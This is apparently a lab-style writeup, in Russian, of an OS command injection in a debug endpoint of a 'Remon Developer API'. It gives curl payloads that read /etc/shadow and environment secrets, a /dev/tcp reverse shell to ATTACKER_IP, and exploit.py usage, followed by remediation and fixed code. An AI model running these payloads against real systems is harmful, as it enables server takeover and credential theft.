# Writeup: OS Command Injection в Remon Developer API

## Общая информация

| Параметр | Значение |
|----------|----------|
| **Тип уязвимости** | OS Command Injection |
| **CWE** | CWE-78 (Improper Neutralization of Special Elements used in an OS Command) |
| **CVSS Score** | 9.8 (Critical) |
| **Эндпоинт** | `POST /api/admin/debug/system-status` |
| **Уязвимый параметр** | `options` |
| **Вектор атаки** | Network / No Authentication Required |

---

## Описание уязвимости

В API-сервере Remon Developer обнаружена критическая уязвимость типа **OS Command Injection** в эндпоинте `/api/admin/debug/system-status`.

Эндпоинт предназначен для "системного мониторинга" и принимает два параметра:
- `tool` — название утилиты из белого списка (`df`, `free`, `uptime`, `top`)
- `options` — дополнительные аргументы для утилиты

### Уязвимый код (backend/src/routes/debug.ts)

```typescript
const allowedTools = ['df', 'free', 'uptime', 'top'];

if (!tool || !allowedTools.includes(tool)) {
  res.status(400).json({ error: 'Invalid tool' });
  return;
}

// УЯЗВИМОСТЬ: options не экранируется!
const fullCommand = `${tool} ${options || ''}`;

exec(fullCommand, (error, stdout, stderr) => {
  res.json({ output: stdout });
});
```

### Почему это работает

1. Параметр `tool` проверяется по белому списку — это **правильно**
2. Параметр `options` **не проходит никакой валидации** — это **критическая ошибка**
3. Функция `child_process.exec()` передаёт команду в `/bin/sh -c`, который интерпретирует метасимволы оболочки
4. Метасимволы `;`, `&&`, `||`, `|`, `` ` ``, `$()` позволяют выполнить произвольные команды

### Итоговая команда при атаке

```
df ; cat /etc/passwd
```

Shell интерпретирует это как две отдельные команды:
1. `df` — выполняется нормально (проходит проверку белого списка)
2. `cat /etc/passwd` — выполняется с правами процесса Node.js

---

## Сценарий атаки

### Шаг 1: Обнаружение эндпоинта

Эндпоинт не требует авторизации (намеренная ошибка конфигурации). При сканировании API обнаруживается:

```
POST /api/admin/debug/system-status
Content-Type: application/json
```

### Шаг 2: Проверка уязвимости

```bash
curl -X POST http://TARGET:5000/api/admin/debug/system-status \
  -H "Content-Type: application/json" \
  -d '{"tool": "df", "options": "; echo PWNED_$(id)"}'
```

**Ответ:**
```json
{
  "output": "Filesystem      Size  Used Avail Use% Mounted on\n...\nPWNED_uid=0(root) gid=0(root) groups=0(root)\n"
}
```

Уязвимость подтверждена — процесс запущен от `root`.

### Шаг 3: Разведка

```bash
# Получить информацию о системе
curl -X POST http://TARGET:5000/api/admin/debug/system-status \
  -H "Content-Type: application/json" \
  -d '{"tool": "df", "options": "; uname -a && cat /etc/os-release"}'

# Прочитать /etc/passwd
curl -X POST http://TARGET:5000/api/admin/debug/system-status \
  -H "Content-Type: application/json" \
  -d '{"tool": "df", "options": "; cat /etc/passwd"}'

# Прочитать /etc/shadow (хеши паролей)
curl -X POST http://TARGET:5000/api/admin/debug/system-status \
  -H "Content-Type: application/json" \
  -d '{"tool": "df", "options": "; cat /etc/shadow"}'

# Прочитать переменные окружения (JWT секреты, пароли БД)
curl -X POST http://TARGET:5000/api/admin/debug/system-status \
  -H "Content-Type: application/json" \
  -d '{"tool": "df", "options": "; env"}'
```

### Шаг 4: Получение Reverse Shell

**На машине атакующего:**
```bash
nc -lvnp 4444
```

**Отправка payload:**
```bash
curl -X POST http://TARGET:5000/api/admin/debug/system-status \
  -H "Content-Type: application/json" \
  -d '{"tool": "df", "options": "; bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''"}'
```

**Результат:** Интерактивный shell с правами `root` на сервере.

---

## Автоматизированная эксплуатация (exploit.py)

### Установка зависимостей
```bash
pip install requests
```

### Проверка уязвимости
```bash
python exploit.py \
  --url http://TARGET:5000/api/admin/debug/system-status \
  --check
```

### Выполнение команды
```bash
python exploit.py \
  --url http://TARGET:5000/api/admin/debug/system-status \
  --cmd "cat /etc/passwd"

python exploit.py \
  --url http://TARGET:5000/api/admin/debug/system-status \
  --cmd "cat /etc/shadow"

python exploit.py \
  --url http://TARGET:5000/api/admin/debug/system-status \
  --cmd "env | grep -E 'JWT|DB|PASS|SECRET'"
```

### Получение Reverse Shell
```bash
# Шаг 1: Запустить слушатель
nc -lvnp 4444

# Шаг 2: Запустить exploit
python exploit.py \
  --url http://TARGET:5000/api/admin/debug/system-status \
  --ip ATTACKER_IP \
  --port 4444
```

### Интерактивный режим
```bash
python exploit.py \
  --url http://TARGET:5000/api/admin/debug/system-status \
  --interactive

# remon-shell$ id
# remon-shell$ cat /etc/shadow
# remon-shell$ ls /root
```

---

## Демонстрация (PoC)

### Запрос
```http
POST /api/admin/debug/system-status HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{
  "tool": "df",
  "options": "; id && cat /etc/hostname && env | grep -E 'JWT|DB|PASS'"
}
```

### Ответ
```json
{
  "output": "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        50G   12G   38G  24% /\n\nuid=0(root) gid=0(root) groups=0(root)\n\nremon-server\n\nJWT_SECRET=remon_super_secret_jwt_key_2025\nJWT_REFRESH_SECRET=remon_refresh_secret_key_2025\nDATABASE_URL=postgresql://remon_user:remon_pass@db:5432/remon_db\n",
  "command": "df ; id && cat /etc/hostname && env | grep -E 'JWT|DB|PASS'"
}
```

**Получено:**
- Права `root`
- JWT секреты (можно подделать любой токен)
- Пароль к базе данных PostgreSQL

---

## Цепочка атаки (Attack Chain)

```
1. Обнаружение эндпоинта
   └─> POST /api/admin/debug/system-status (без авторизации)

2. Проверка уязвимости
   └─> options="; echo PWNED_$(id)"
   └─> Подтверждение: uid=0(root)

3. Разведка
   ├─> Чтение /etc/passwd, /etc/shadow
   ├─> Получение JWT_SECRET → подделка токенов
   └─> Получение DATABASE_URL → прямой доступ к БД

4. Закрепление
   ├─> Reverse shell → полный контроль над сервером
   ├─> Создание backdoor пользователя
   └─> Установка persistence (cron, systemd)

5. Горизонтальное перемещение
   └─> Доступ к PostgreSQL → дамп всех данных пользователей
```

---

## Почему уязвимость не была обнаружена

1. **Ложное чувство безопасности**: разработчик проверил `tool` по белому списку и решил, что этого достаточно
2. **Отсутствие code review**: уязвимый код не прошёл проверку безопасности
3. **Отсутствие авторизации**: эндпоинт доступен без JWT токена
4. **Запуск от root**: Node.js процесс запущен с максимальными привилегиями

---

## Рекомендации по устранению

### 1. Использовать `spawn` вместо `exec`

```typescript
// НЕБЕЗОПАСНО:
exec(`${tool} ${options}`, callback);

// БЕЗОПАСНО:
import { spawn } from 'child_process';
const args = options ? options.split(' ').filter(Boolean) : [];
const proc = spawn(tool, args, { shell: false }); // shell: false — ключевой параметр!
```

### 2. Строгая валидация параметра `options`

```typescript
// Разрешить только безопасные символы
const safeOptions = /^[a-zA-Z0-9\s\-\.\/]*$/;
if (options && !safeOptions.test(options)) {
  return res.status(400).json({ error: 'Invalid options' });
}
```

### 3. Добавить авторизацию

```typescript
// Эндпоинт должен требовать JWT + роль admin
router.post('/system-status', authMiddleware, adminMiddleware, handler);
```

### 4. Принцип наименьших привилегий

```dockerfile
# Запускать Node.js от непривилегированного пользователя
USER node
```

### 5. Использовать встроенные API Node.js

```typescript
import os from 'os';
import { execFileSync } from 'child_process';

// Вместо exec('df') — использовать безопасный вызов
const output = execFileSync('df', ['-h'], { encoding: 'utf8' });
```

---

## Исправленный код

```typescript
import { Router, Request, Response } from 'express';
import { execFile } from 'child_process';
import { authMiddleware, adminMiddleware } from '../middleware/auth';

const router = Router();

// Теперь требует авторизации
router.post('/system-status', authMiddleware, adminMiddleware, (req: Request, res: Response) => {
  const { tool } = req.body;

  const allowedTools: Record<string, string[]> = {
    'df': ['-h'],
    'free': ['-h'],
    'uptime': [],
  };

  if (!tool || !allowedTools[tool]) {
    res.status(400).json({ error: 'Invalid tool' });
    return;
  }

  // execFile не использует shell — метасимволы не интерпретируются
  execFile(tool, allowedTools[tool], (error, stdout) => {
    if (error) {
      res.status(500).json({ error: error.message });
      return;
    }
    res.json({ output: stdout });
  });
});
```

---

## Заключение

Данная уязвимость демонстрирует классическую ошибку при разработке API — недостаточную валидацию пользовательского ввода перед передачей в системные функции. Несмотря на наличие белого списка для параметра `tool`, отсутствие валидации параметра `options` позволяет злоумышленнику выполнить произвольные команды с правами процесса.

В реальных условиях такая уязвимость привела бы к:
- Полной компрометации сервера
- Утечке всех данных пользователей
- Возможности установки вредоносного ПО
- Использованию сервера в качестве точки для дальнейших атак

**Ключевой вывод**: никогда не передавайте пользовательский ввод напрямую в функции выполнения системных команд. Используйте `execFile`/`spawn` с явным указанием аргументов и `shell: false`.
